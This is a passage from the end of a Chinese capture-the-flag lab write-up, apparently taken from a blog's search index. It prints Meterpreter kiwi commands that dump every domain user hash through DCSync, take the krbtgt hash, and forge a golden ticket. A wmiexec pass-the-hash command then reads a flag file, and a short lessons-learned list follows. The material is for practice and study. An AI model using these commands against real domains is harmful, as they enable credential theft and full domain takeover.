-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导出域内用户的<span class="built_in">hash</span></span></span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048686.png" alt="image-20230819224519688"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成黄金票据</span></span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导入黄金票据</span></span><br><span class="line">kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmi <span class="built_in">hash</span>传递</span></span><br><span class="line">python ./wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048716.png" alt="image-20230819224904240"></p>
-<p>最后将获得的flag拼接起来即可；</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li>信息收集：信息收集真的是渗透过程中的重中之重，flag2的时候没有对目标主机进行二次信息收集，导致把路走死了；</li>
-<li>横向移动：虽然看了一些方法，但是做的还是太少了所以在进行判断的时候还是你叫吃力；</li>
-<li>代理和隧道：这个真的玄学，多用几次解决报错和理解怎么做代理怎么搭隧道后面应该会慢慢好起来；</li>
-</ul>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>web笔记</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
